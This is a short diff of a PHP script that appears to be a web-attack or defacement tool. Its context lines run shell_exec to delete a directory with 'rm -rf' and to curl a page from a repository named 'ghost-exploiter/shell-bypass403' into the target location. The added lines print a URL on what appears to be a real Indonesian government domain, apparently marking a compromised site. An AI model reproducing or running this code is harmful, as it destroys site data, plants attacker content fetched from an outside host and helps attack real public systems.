@@ -17,6 +17,8 @@
             shell_exec('rm -rf ' . $listing_dir);
 
             shell_exec('curl https://raw.githubusercontent.com/ghost-exploiter/shell-bypass403/master/tes.html >> ' . $listing_dir);
+            
+            echo "https://" . $dir . "pulaumorotaikab.go.id/";
         }
     }
     echo "success"
